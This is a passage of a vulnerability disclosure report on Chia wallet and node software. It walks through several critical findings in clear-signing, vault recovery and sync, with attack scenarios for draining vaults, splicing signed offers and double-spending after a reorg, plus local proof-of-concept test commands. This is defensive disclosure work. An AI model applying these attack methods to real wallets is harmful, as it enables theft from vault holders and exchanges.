  -p chia-sdk-driver clear_signing::tests::test_poc5 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-04": {
    "RED": {
      "poc5_vault_spend_bundle_sha256": "a9eeda2c8526d95cb0a36ffcdf9a026b23e96c11e15ee419938e18dc342277eb",
      "poc5_vault_spend_bundle_bytes": 1303,
      "poc5_attached_settlement_spend_bundle_sha256": "e0b876fbb8e0f26400a38fb5e2e9963a5cb1dbff92b76d78b4403ed0cb2f7cbe",
      "poc5_attached_settlement_bytes": 388,
      "hidden_outflow_mojo": 600000000000000
    },
    "GREEN": {
      "poc5_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.28 — Chia-Network/cni-wallet-sdk (`chia-sdk-bindings <= 0.38.0 / chia-sdk-driver <= 0.36.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing External `DropCoin` Vault Change Spoofing Hiding `1,000 XCH` Vault Drain Across the `chia-sdk-bindings` FFI Boundary (`CS-05` / `POC-6`) (`CWE-682 / CWE-451`, CVSS `9.1 Critical`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (`chia-sdk-driver` & `chia-sdk-bindings` FFI): chia-sdk-bindings`)
* **Affected Versions & Components:** `chia-sdk-bindings <= 0.38.0 / chia-sdk-driver <= 0.36.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs`, `crates/chia-sdk-bindings/src/clear_signing.rs:62` (`parse_vault_transaction`)
* **Vulnerability Class & Score:** `CWE-682 / CWE-451` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md`](advisories/zh-CN/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — External `DropCoin` Output Credited as Vault Change (`clear_signing.rs` & `chia-sdk-bindings/src/clear_signing.rs:62`):** When `parse_vault_transaction` computes the net outflow of a Vault transaction, it credits outputs sent to the vault's puzzle hash as vault change without verifying that the parent coin creating that output actually belonged to the vault (`DropCoin` parent lineage).
2. **Step 2 — Masking a `1,000 XCH` (`1,000,000,000,000,000 mojo`) Vault Drain (`SpendBundle SHA-256: aa65182292515596...`):** In `POC-6` (`1,477 bytes`), the victim's vault sends `1,000 XCH` to the attacker while an external `DropCoin` spend included in the bundle creates a `1,000 XCH` output to the vault's puzzle hash. Unpatched Clear-Signing nets the two against each other and reports `0 XCH` net vault loss!
3. **Step 3 — Verified Directly Across the Production `chia-sdk-bindings` FFI Entrypoint (`clear_signing_ffi_proof.rs`):** Calling `chia_sdk_bindings::parse_vault_transaction` directly confirms the FFI boundary misreports the `1,000 XCH` drain in `RED` and returns `Error::NonStandardInnerSpend` in `GREEN`.

```rust
// File: crates/chia-sdk-bindings/src/clear_signing.rs (line 62) & chia-sdk-driver/src/clear_signing.rs
pub fn parse_vault_transaction(vault: ClvmVault, spend_bundle: SpendBundle, ...) -> Result<TransactionSummary> {
    // BUG: Credits outputs from external non-vault DropCoin spends as vault change,
    // masking a 1,000 XCH outflow from the victim's vault!
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — `1,000 XCH` (`1,000,000,000,000,000 mojo`) Enterprise Vault Drain Displayed as Zero Net Outflow at the FFI Boundary (`POC-6`):** An institutional custodian reviews `SpendBundle` `aa6518229251559629861e9137f5cbd5186cb20b46c216a64dc209b86ed3004e` (`1,477 bytes`) via a mobile/hardware signer powered by `chia-sdk-bindings` and sees `0 XCH` net vault outflow while signing away `1,000 XCH`.
* **Scenario B — Multi-Sig Quorum Deception:** Multiple hardware cosigners independently verify the same FFI `TransactionSummary` and approve the `1,000 XCH` theft.
* **Scenario C — FFI Boundary Patch Verification (`GREEN`):** `clear_signing_ffi_proof.rs` verifies `parse_vault_transaction` rejects the spoofed `DropCoin` bundle with `Error::NonStandardInnerSpend`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-6 in chia-sdk-driver and the FFI Boundary Proof in chia-sdk-bindings
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc6 -- --nocapture
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-bindings --test clear_signing_ffi_proof -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-05": {
    "RED": {
      "poc6_spend_bundle_sha256": "aa6518229251559629861e9137f5cbd5186cb20b46c216a64dc209b86ed3004e",
      "poc6_spend_bundle_bytes": 1477,
      "vault_drain_amount_mojo": 1000000000000000,
      "ffi_boundary_parse_vault_transaction_masked": true
    },
    "GREEN": {
      "ffi_boundary_rejected_with": "Error::NonStandardInnerSpend",
      "ffi_test_file_sha256": "73dbe05adb2538ceb88cca5b2ecf4c1678e4ed537d3accb17535d8666727fb52"
    }
  }
}
```


---

### III.29 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Offer Pre-Split Unbound Destination Splicing Redirecting `1,000 XCH` Under an Unchanged BLS Signature (`CS-06` / `POC-7`) (`CWE-347 / CWE-451`, CVSS `9.1 Critical`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (offer pre-split coin destination binding)
* **Vulnerability Class & Score:** `CWE-347 / CWE-451` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md`](advisories/zh-CN/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Pre-Split Intermediate Coin Spent Without Cryptographic Destination Binding (`clear_signing.rs`):** In an Offer pre-split transaction (`POC-7`), the user signs a bundle (`476b8e836e435eecb16fb924b8d8b8532fb6872fda3f9d50030d98231fff7833`, `1,994 bytes`) that splits `1,000 XCH` (`1,000,000,000,000,000 mojo`) into an intermediate settlement/pre-split coin whose downstream spend is not pinned by an `ASSERT_PUZZLE_ANNOUNCEMENT` signed by the vault.
2. **Step 2 — Post-Signature Splicing Under the Same BLS Signature:** After the victim signs the pre-split bundle, an attacker or relayer replaces/splices the downstream child spend, producing final `SpendBundle` `5b3a3b21376bfdfe06e7cc1ec334c43ffd3bb97b72133aeaa38f4de040ba0a93` (`1,701 bytes`).
3. **Step 3 — `1,000 XCH` Redirected to Attacker While BLS Signature Remains Valid:** Because the vault's signed condition only covered the pre-split creation and not the final recipient, the victim's original BLS signature validates the modified `1,000 XCH` transfer to the attacker.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Accepts pre-split / intermediate child spends in Clear-Signing without verifying
// that the vault's signed spend asserts an announcement binding the child spend's outputs!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Relayer / DEX Aggregator Redirects `1,000 XCH` (`1,000,000,000,000,000 mojo`) After User Signs (`POC-7`):** The victim signs `476b8e836e435eecb16fb924b8d8b8532fb6872fda3f9d50030d98231fff7833`; the relayer splices the unbound child spend into `5b3a3b21376bfdfe06e7cc1ec334c43ffd3bb97b72133aeaa38f4de040ba0a93` and steals `1,000 XCH` under the unchanged BLS signature.
* **Scenario B — Mempool Front-Running of Unbound Pre-Split Spends:** Any mempool observer replaces the unsigned child spend before block inclusion.
* **Scenario C — Patched Verification (`GREEN`):** Clear-Signing requires every downstream spend in the bundle to be cryptographically bound by an announcement asserted in the signed vault spend.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-7 (1,000 XCH Offer Pre-Split Post-Signature Splicing) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc7 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-06": {
    "RED": {
      "poc7_pre_split_spend_bundle_sha256": "476b8e836e435eecb16fb924b8d8b8532fb6872fda3f9d50030d98231fff7833",
      "poc7_pre_split_bytes": 1994,
      "poc7_spliced_final_spend_bundle_sha256": "5b3a3b21376bfdfe06e7cc1ec334c43ffd3bb97b72133aeaa38f4de040ba0a93",
      "poc7_spliced_final_bytes": 1701,
      "redirected_amount_mojo": 1000000000000000,
      "original_bls_signature_valid_on_spliced": true
    },
    "GREEN": {
      "poc7_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.30 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Reverse-Clawback `sender_puzzle_hash` Ownership Spoofing Allowing Unilateral `1,000 XCH` Hijack (`CS-07` / `POC-8`) (`CWE-345 / CWE-451`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (Clawback `sender_puzzle_hash` ownership check)
* **Vulnerability Class & Score:** `CWE-345 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md`](advisories/zh-CN/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Missing Verification That `sender_puzzle_hash` Belongs to the Signing Vault (`clear_signing.rs`):** When a Vault creates a Clawback-protected output (`POC-8`), `cni-wallet-sdk` inspects the Clawback parameters and memo/hint without verifying that the Clawback `sender_puzzle_hash` (the party authorized to claw back the coin before the timelock expires) is owned by the signing vault.
2. **Step 2 — Reverse-Clawback Trap (`SpendBundle SHA-256: 6897c10eb9cf718f...`):** In `SpendBundle` `6897c10eb9cf718ffa9bbfff998e6a496d3532bf2d198c8df16bf92e2d5f9db1` (`1,218 bytes`), `1,000 XCH` (`1,000,000,000,000,000 mojo`) from the victim's vault is locked into a Clawback coin where `sender_puzzle_hash` is set to the attacker's puzzle hash.
3. **Step 3 — Attacker Immediately Claws Back the Victim's `1,000 XCH`:** The moment the transaction lands on-chain, the attacker exercises the `sender_puzzle_hash` branch to immediately sweep the `1,000 XCH` before the timelock expires.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Parses Clawback output without verifying clawback.sender_puzzle_hash == vault_p2_puzzle_hash,
// allowing an attacker to be set as the Clawback sender on a 1,000 XCH vault outflow!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — `1,000 XCH` (`1,000,000,000,000,000 mojo`) Vault Transfer Hijacked via Reverse Clawback (`POC-8`):** A vault operator signs `6897c10eb9cf718ffa9bbfff998e6a496d3532bf2d198c8df16bf92e2d5f9db1` believing the transfer is protected by Clawback; the attacker is curried as `sender_puzzle_hash` and immediately sweeps the `1,000 XCH`.
* **Scenario B — Self-Transfer / Escrow Illusion:** The recipient/memo points back to the victim's own address so Clear-Signing looks like a safe self-custody move, while `sender_puzzle_hash` gives the attacker instant withdrawal rights.
* **Scenario C — Patched Verification (`GREEN`):** Clear-Signing rejects any Clawback output funded by the vault whose `sender_puzzle_hash` does not belong to the vault.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-8 (1,000 XCH Reverse-Clawback Sender Hijack) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc8 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-07": {
    "RED": {
      "poc8_spend_bundle_sha256": "6897c10eb9cf718ffa9bbfff998e6a496d3532bf2d198c8df16bf92e2d5f9db1",
      "poc8_spend_bundle_bytes": 1218,
      "hijacked_clawback_amount_mojo": 1000000000000000,
      "attacker_is_clawback_sender": true
    },
    "GREEN": {
      "poc8_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.31 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing External CAT Ring Melt/Issuance Accounting Omission Hiding `750 XCH`-Scale Asset Drain (`CS-08` / `POC-9`) (`CWE-682 / CWE-451`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (external CAT ring TAIL melt/issuance accounting)
* **Vulnerability Class & Score:** `CWE-682 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md`](advisories/zh-CN/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Chia CAT Ring Conservation Balances Across All Spends in the Ring:** In Chia's CAT2 standard, multiple CAT coin spends form a ring where a negative `extra_delta` (`RUN_TAIL` melt, opcode `51 0 -113`) in an external ring member is funded by the excess input of the victim vault's CAT spend.
2. **Step 2 — Clear-Signing Ignores External Ring Members Executing `RUN_TAIL` (`clear_signing.rs`):** In `POC-9` (`SpendBundle SHA-256: e48c3171dc9a9b4b5914597784e7b5039a9af340c66aa2158bac22f1fba295ff`, `2,541 bytes`), the victim's vault supplies `750,000,000,000,000` mojos (`750 XCH` scale) into the CAT ring while an external ring coin melts/extracts the delta without appearing as a vault outflow in Clear-Signing.
3. **Step 3 — Signer Approves Hidden `750 XCH`-Scale CAT Drain:** The user signs what appears to be a balanced CAT ring spend while `750,000,000,000,000` mojos are absorbed by the external ring member.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Does not account for external CAT ring members executing RUN_TAIL melt/issuance deltas
// funded by the vault's CAT coin spend!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Hidden `750 XCH`-Scale (`750,000,000,000,000 mojo`) CAT Ring Melt Drain (`POC-9`):** A treasury signs `SpendBundle` `e48c3171dc9a9b4b5914597784e7b5039a9af340c66aa2158bac22f1fba295ff` (`2,541 bytes`), funding an external CAT ring melt invisible in the Clear-Signing summary.
* **Scenario B — Wrapped-Asset / Stablecoin Redemption Hijack:** An attacker pairs a victim's CAT spend with an external redemption/melt spend to extract underlying XCH or bridge credits.
* **Scenario C — Patched Verification (`GREEN`):** Clear-Signing verifies full ring conservation across all CAT ring members.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-9 (750 XCH-Scale External CAT Ring Melt/Issuance Omission) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc9 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-08": {
    "RED": {
      "poc9_spend_bundle_sha256": "e48c3171dc9a9b4b5914597784e7b5039a9af340c66aa2158bac22f1fba295ff",
      "poc9_spend_bundle_bytes": 2541,
      "omitted_cat_ring_delta_mojo": 750000000000000
    },
    "GREEN": {
      "poc9_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.32 — Chia-Network/chia-vault-recover (`<= 1.0.0-rc9 (verified on commit 75e3a8efe02a131adbf3059afc20852de183ca82)`) — `chia-vault-recover` Unverified First-Child Singleton Launcher Selection Allowing 1-Mojo Dust Poisoning of Emergency Vault Recovery (`VR-01` / `POC-10`) (`CWE-345 / CWE-400`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-vault-recover` (`Cargo / Rust (Chia Emergency Vault Recovery CLI): chia-vault-recover`)
* **Affected Versions & Components:** `<= 1.0.0-rc9 (verified on commit 75e3a8efe02a131adbf3059afc20852de183ca82)` — `src/locate.rs:148-219` (`find_launcher_id`)
* **Vulnerability Class & Score:** `CWE-345 / CWE-400` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md`](advisories/zh-CN/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unverified First-Match `SINGLETON_LAUNCHER_HASH` Return in `find_launcher_id` (`src/locate.rs:148-219`):** To locate a user's Vault singleton, `find_launcher_id` fetches all coins at the user's address via `get_coin_records_by_puzzle_hash`, inspects each coin's parent spend, and immediately returns the **first** child coin whose puzzle hash equals `SINGLETON_LAUNCHER_HASH`.
2. **Step 2 — 1-Mojo Dust Coin Poisons Vault Discovery at lower Block Height (`height=9..10` vs `height=11..12`):** An attacker sends a 1-mojo dust coin to the victim's address from a parent spend that also spawns a decoy singleton (`2de44601e6fcf4bdfc88eb553ddca729751a06da78cec724519e741f1dfefacf`). Because Chia's `FullNodeRpcApi` returns coin records ordered by confirmation height, `find_launcher_id` selects the attacker's decoy launcher before reaching the victim's real Vault launcher (`e53d0c41ce3a78de1426630d059958ef37a5d7f55551d47908f9a106024640eb`).
3. **Step 3 — Compiled Release CLI Aborts With `clawback check: recovery phrase does not match`:** Executed against a live `FullNodeRpcApi` server with zero static fixtures, the unpatched CLI (`chia-vault-recover-red`) locks onto `2de44601...` and terminates with exit code `1`, whereas the patched release binary (`chia-vault-recover 1.0.0-rc9`, `SHA-256: d6e6b0bb5e0d160d9a342274e2c1d384f67fa57c0c218267b27f46195c1370c3`) skips the decoy and recovers the victim's vault.

```rust
// File: src/locate.rs (lines 148-219)
pub async fn find_launcher_id(client: &Client, address_puzzle_hash: Bytes32, ...) -> Result<Bytes32> {
    // BUG: Returns the very first SINGLETON_LAUNCHER_HASH child found at address_puzzle_hash
    // without verifying that the singleton's custody/recovery configuration matches the user's keys!
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — 1-Mojo Dust Transaction Locks Emergency Vault Recovery CLI (`POC-10`):** When a user loses their primary signer and runs `chia-vault-recover` (`1.0.0-rc9`) with their recovery phrase, a single 1-mojo dust coin sent by an attacker causes the CLI to abort with `clawback check: recovery phrase does not match`.
* **Scenario B — Combined Attack Chain (`WLC-02` + `VR-01` — Total Vault Recovery Lockout):** While an attacker's unauthorized Vault recovery timer counts down, the attacker blocks the victim's live wallet cancellation via `WLC-02` and simultaneously poisons `chia-vault-recover` via `VR-01`, leaving the victim with zero working recovery tools.
* **Scenario C — Pre-Emptive Mass Address Poisoning:** Because any public Chia address can receive 1-mojo dust, an attacker can pre-poison known institutional Vault addresses for pennies.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run the Rust Unit Tests in chia-vault-recover (45/45 PASS)
cargo test --manifest-path /home/community-user/targets/chia-vault-recover/Cargo.toml

# 2. Run the Live FullNodeRpcApi + Release CLI (1.0.0-rc9) E2E Proof (Zero Static Fixtures)
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k poc10
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-VR-01": {
    "RED": {
      "attacker_decoy_launcher_id": "2de44601e6fcf4bdfc88eb553ddca729751a06da78cec724519e741f1dfefacf",
      "victim_true_launcher_id": "e53d0c41ce3a78de1426630d059958ef37a5d7f55551d47908f9a106024640eb",
      "red_cli_selected_launcher_id": "2de44601e6fcf4bdfc88eb553ddca729751a06da78cec724519e741f1dfefacf",
      "red_cli_exit_code": 1,
      "red_cli_stderr": "clawback check: recovery phrase does not match"
    },
    "GREEN": {
      "green_release_cli_sha256": "d6e6b0bb5e0d160d9a342274e2c1d384f67fa57c0c218267b27f46195c1370c3",
      "green_cli_selected_launcher_id": "e53d0c41ce3a78de1426630d059958ef37a5d7f55551d47908f9a106024640eb",
      "green_cli_matches_victim": true,
      "cargo_unit_tests_passed": 45
    }
  }
}
```


---

### III.33 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia `FullNode` Port `8444` Unverified `NewPeak` / `sync_from_fork_point` Synchronization Lockout & `10,000 XCH` Fork-Reorg Double-Spend Impact (`CONS-SP-01`) (`CWE-400 / CWE-345`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/full_node/full_node.py:2220-2310` (`new_peak` / `sync_from_fork_point`)
* **Vulnerability Class & Score:** `CWE-400 / CWE-345` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md`](advisories/zh-CN/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Repeated `sync_from_fork_point` Aborts Without Peer Disconnection (`chia/full_node/full_node.py:2220-2310`):** When an unauthenticated mTLS 1.3 P2P peer on port `8444` advertises a higher `NewPeak` and supplies invalid or empty sub-epoch/weight-proof responses during `sync_from_fork_point`, `FullNode` aborts the sync attempt without disconnecting or banning the malicious peer.
2. **Step 2 — 3-Node mTLS 1.3 Topology Sync Starvation (`victim_peak_height: None`):** Verified across a real 3-node mTLS 1.3 topology (`Honest Node` at `height=5`, `Malicious Peer`, `Victim Node`), 5 consecutive poisoned sync rounds keep the victim node's `peak` at `None` (`0`) and prevent it from syncing to the honest peer.
3. **Step 3 — `10,000 XCH` (`10,000,000,000,000,000 mojo`) Fork-Reorg Double-Spend Demonstration (`Section 8.5`):** While a node's view of the canonical chain is delayed or split at `fork_height=5`, an attacker spends a `10,000 XCH` coin (`006f4366cd3778cc...`) to an exchange on `Branch A` (`height=7`, `SpendBundle SHA-256: 26afe149e702e4a6...`) and to their own vault on heavier `Branch B` (`height=9`, `SpendBundle SHA-256: ad2eba4d67c52314...`), wiping out the exchange's `10,000 XCH` deposit upon reorg.

```python
# File: chia/full_node/full_node.py (lines 2220-2310)
async def sync_from_fork_point(self, fork_point_height: int, target_peak_sb_height: uint32, peak_hash: bytes32, ...):
    # BUG: When peer returns invalid weight proof / sub-epoch summary, sync aborts without
    # disconnecting/banning the peer, allowing indefinite sync starvation over port 8444!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Port `8444` mTLS Sync Lockout Against Exchange & Pool FullNodes:** A single remote P2P peer stalls a victim `FullNode` across consecutive sync rounds, preventing it from advancing to the canonical chain offered by honest peers.
* **Scenario B — `10,000 XCH` (`10,000,000,000,000,000 mojo`) Exchange Deposit + Fork-Reorg Double-Spend (`Section 8.5`):** An attacker deposits `10,000 XCH` (`SpendBundle` `26afe149e702e4a622a5675aa77481e6b54074e3cfa98db93a47ef24c1793f8b`) on `Branch A` (`height=7`) to an exchange accepting early confirmations (`min_confirmations=1`), withdraws fiat/USDT, and releases heavier `Branch B` (`height=9`, `SpendBundle` `ad2eba4d67c52314303e62601ed42d89c2c4f488d67c9cc0554a3137c9214c33`), reducing the exchange's on-chain balance from `10,000 XCH` to `0` (`GREEN` with `min_confirmations=32` holds the deposit in `PENDING_FINALITY` with `0` loss).
* **Scenario C — Combined Chain (`CONS-SP-01` + `WLC-01`):** Blinding a merchant's FullNode on port `8444` while feeding counterfeit light-wallet headers via `WLC-01`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run the 3-Node Port 8444 mTLS Sync Lockout Proof
/home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_real_e2e_followup_proofs.py -k cons_sp01

# 2. Run the 10,000 XCH (10,000,000,000,000,000 mojo) Fork-Reorg Double-Spend Proof (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k reorg
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k reorg
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CONS-SP-01": {
    "RED": {
      "mtls_3node_victim_peak_after_5_rounds": null,
      "fork_height": 5,
      "split_coin_id": "006f4366cd3778cc13e11647a0f4dd43552088db526a289c65de3493fa01a411",
      "branch_a_exchange_deposit_spend_bundle_sha256": "26afe149e702e4a622a5675aa77481e6b54074e3cfa98db93a47ef24c1793f8b",
      "branch_b_attacker_vault_spend_bundle_sha256": "ad2eba4d67c52314303e62601ed42d89c2c4f488d67c9cc0554a3137c9214c33",
      "exchange_pre_reorg_balance_mojo": 10000000000000000,
      "exchange_post_reorg_balance_mojo": 0,
      "attacker_post_reorg_balance_mojo": 10000000000000000
    },
    "GREEN": {
      "mtls_3node_victim_synced_height": 5,
      "exchange_status_at_1_conf": "PENDING_FINALITY",
      "exchange_loss_mojo": 0
    }
  }
}
```


---

### III.34 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia Wallet `take_offer` / `respond_to_offer` Unbounded Implicit Coin Selection & Signing Without Per-Asset User Spend Cap (`WLT-OFFER-01`) (`CWE-863`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/rpc/wallet_rpc_api.py` (`take_offer`), `chia/wallet/trade_manager.py` (`respond_to_offer`)
* **Vulnerability Class & Score:** `CWE-863` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md`](advisories/zh-CN/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md)

